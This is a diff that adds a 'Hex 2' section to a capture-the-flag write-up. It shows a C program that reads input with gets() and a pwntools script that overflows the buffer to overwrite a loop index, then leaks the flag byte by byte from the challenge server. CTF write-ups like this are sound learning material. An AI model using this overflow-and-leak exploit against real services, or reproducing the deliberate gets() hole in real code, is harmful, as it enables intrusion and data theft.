@@ -118,5 +118,59 @@ p.sendline(b"A" * 28 + p32(0xffffffff - 0x40))
 print(bytes.fromhex(p.recvline().decode()) )
 ```
 
-Ez and fun challenge. hex2 is even more interseting!
+Ez and fun challenge.
 
+*Hex 2*
+
+this challenge is pretty much the same as hex2. here is the source code:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+
+    int i = 0;
+
+    char name[16];
+    printf("input text to convert to hex: \n");
+    gets(name);
+
+    char flag[64];
+    fgets(flag, 64, fopen("flag.txt", "r"));
+    // TODO: PRINT FLAG for cool people ... but maybe later
+
+    while (1)
+    {
+        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
+        printf("%02X", (unsigned int)(name[i] & 0xFF));
+
+        // exit out of the loop
+        if (i <= 0)
+        {
+            printf("\n");
+            return 0;
+        }
+        i--;
+    }
+}
+```
+The only difference is that inside the while loop, it checks for negative i, and exits.
+The stack will look exactly the same as hex1, so we can override i again.
+As we can see in the while loop, it will print the `name[i]` for us, and then exit! this is good to us, because this way we can leak the flag byte by byte. here is the exploit:
+
+```py
+from pwn import *
+elf = ELF("./chal")
+
+flag = ''
+for i in range(1, 70):
+	p = remote('amt.rs' , 31631)
+	p.recvline()
+	p.sendline(b"A" * 28 + p32(0xffffffff - 0x40 + i))
+	flag += chr(int(p.recvline()[:-1].decode(), 16))
+	print(flag)
+	p.close()
+```
